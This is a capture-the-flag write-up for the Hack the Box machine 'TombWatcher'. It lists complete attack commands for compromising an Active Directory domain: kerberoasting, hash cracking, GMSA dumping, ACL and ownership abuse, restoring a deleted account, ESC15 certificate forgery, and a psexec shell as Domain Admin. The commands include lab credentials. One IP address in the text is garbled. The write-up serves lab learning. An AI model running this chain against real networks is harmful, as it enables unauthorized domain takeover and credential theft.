# TombWatcher

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Medium**


## Table of Contents
- [Key Learnings](#key-learnings)
- [Walkthrough](#walkthrough)
- [Remediation Summary](#remediation-summary)


## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Abuse GenericAll and ForceChangePassword privileges to change user passwords using *net rpc*
- Exploit GenericWrite privileges by running a targeted kerberoasting attack on vulnerable account
- Abuse DCSync privs to dump SAM and LSA hashes and compromise the Domain Controller by passing the hash
- Use Hashcat to crack .psafe3 file


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan

![image](https://github.com/user-attachments/assets/38c052d5-4737-4dd6-a5ab-eddd228b28da)

2. With Henry's credentials, enumerate network using Bloodhound. Found high-level path to machine

![image](https://github.com/user-attachments/assets/acff890c-ed2b-45b7-a016-f0f7f93aebef)

3. With Henry's credentials, do a targeted kerberoast attack on Alfred

`targetedKerberoast.py -v -d tombwatcher.htb -u henry -p H3nry_987TGV!`

4. We crack the hash using hashcat and we get Alfred's password: basketball

`hashcat -m 13100 hash.txt /usr/share/wordlist/rockyou.txt`

![image](https://github.com/user-attachments/assets/60b15e59-d3fe-4e3a-b44e-e668b79b5e84)

5. Add Alfred to Infrastructure group using BloodyAD

`sudo python3 /opt/bloodyAD/bloodyAD.py --host 10.129.47.3 -d TOMBWATCHER.HTB -u ALFRED -p basketball add groupMember INFRASTRUCTURE ALFRED`

6. Get GMSA password using netexec

`nxc ldap 10.129.47.3 -u alfred -p basketball --gmsa`

![image](https://github.com/user-attachments/assets/cbdf43c4-6647-4fa9-a0a3-e2b0588ebf90)

7. Ansible_dev$ has ForceChangePassword priv on Sam. Use ansible_dev$'s hash to change Sam's password

`sudo python3 /opt/bloodyAD/bloodyAD.py --host 10.129.47.3 -d TOMBWATCHER.HTB -u "ansible_dev\$" -p ":4b21348ca4a9edff9689cdf75cbda439" set password sam Password1`

8. Sam has WriteOwner privilege on John. Change John's owner to Sam using Impacket's owneredit.py script

`sudo python3 /usr/lib/python3/dist-packages/impacket/examples/owneredit.py -action write  -target 'John' -dc-ip 10.129.47.3 -new-owner 'sam' 'tombwatcher.htb'/'sam':'Password1'` 

![image](https://github.com/user-attachments/assets/7aaa18a9-d749-4a41-9860-1e97ad98812f)

9. Now that Sam is owner of John, give Sam FullControl rights on John's account with Impacket's dacledit.py script.

`sudo python3 /usr/lib/python3/dist-packages/impacket/examples/dacledit.py -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb'/'sam':'Password1' -dc-ip 10.129.47.32.88`

10. Can now change John's password

`sudo python3 /opt/bloodyAD/bloodyAD.py --host 10.129.32.88 -d tombwatcher.htb -u sam -p Password1 set password john Password123`

11. John can PSRemote into the machine, so with evil-winrm we gain access to the box and get the user flag!

![image](https://github.com/user-attachments/assets/9622d803-053e-47d6-b7f0-bc889232e4fe)

12. From here, John has GenericAll privileges on the Certificate Services, ADCS, so give John FullControl of ADCS.

`dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal-dn 'CN=JOHN,CN=USERS,DC=TOMBWATCHER,DC=HTB' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'Password123' -dc-ip 10.129.32.88`

![image](https://github.com/user-attachments/assets/b35acffb-19d6-4dcc-9fc6-a9ca3e13c40b)

13. Using Powershell, we look for all users in the ADCS group, but returns none.

`Get-ADUser -Filter * -SearchBase "OU=ADCS,DC=TOMBWATCHER,DC=HTB"`

![image](https://github.com/user-attachments/assets/8eff94bc-94ec-48aa-8b0a-1fe221ba5ae6)

14. After considering the title of the box, TombWatcher, we look for deleted objects.

`Get-ADObject -Filter 'ObjectClass -eq "user" -and IsDeleted -eq $True' -IncludeDeletedObjects`

![image](https://github.com/user-attachments/assets/83112f89-da07-42af-ac6f-1d9b82f5faf5)

15. Shows the cert_admin user has been deleted. Let's try to restore the account and enable it again using PowerShell

`Restore-ADObject -Identity 'f80369c8-96a2-4a7f-a56c-9c15edd7d1e3'`

16. Check cert_admin account is restored

`Get-ADUser -Filter * -SearchBase "OU=ADCS,DC=TOMBWATCHER,DC=HTB"`

![image](https://github.com/user-attachments/assets/6a82727a-bf1b-4bcc-9990-d8539361fcef)

17. Success! Now, change cert_admin's password using John's GenericAll privs on that account

`sudo python3 /opt/bloodyAD/bloodyAD.py --host 10.129.47.78 -u john -p Password123 set password cert_admin Summer2025`

18. With cert_admin's account, we naturally enumerate for vulnerable certificate templates with certipy. Certipy returns a WebServer template that's vulnerable to ESC15

`certipy find -u cert_admin -p Summer2025 -dc-ip 10.129.47.78 -enabled -vulnerable`

![image](https://github.com/user-attachments/assets/e0ae6706-66dc-4b5b-96af-89790ca715c9)

19. Using certipy, request the WebServer template with admin's UPN and SID.

`certipy req -dc-ip 10.129.32.88 -ca tombwatcher-CA-1 -u cert_admin -p Summer2025 -template WebServer -upn Administrator@tombwatcher.htb -application-policies 'Client Authentication' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500'`

20. With admin's certificate, we get a root ldap shell on the machine. With the ldap shell, add user John to Domain Admins group

`certipy auth -pfx administrator1.pfx -dc-ip 10.129.32.88 -ldap-shell`

![image](https://github.com/user-attachments/assets/5f2f263b-3bf8-41de-9375-f944d88c163e)

21. Check John is Domain Admin with netexec and then get root shell on the machine using psexec.py

`nxc smb 10.129.32.88 -u john -p Password123`

`psexec.py john:Password123@10.129.32.88`

![image](https://github.com/user-attachments/assets/3688c466-0203-457f-841d-c225bc93a605)

22. Get root flag and pwned!
![image](https://github.com/user-attachments/assets/a0bf96da-888e-4e30-a317-ba3ddc7eb813)


## Remediation Summary
- 


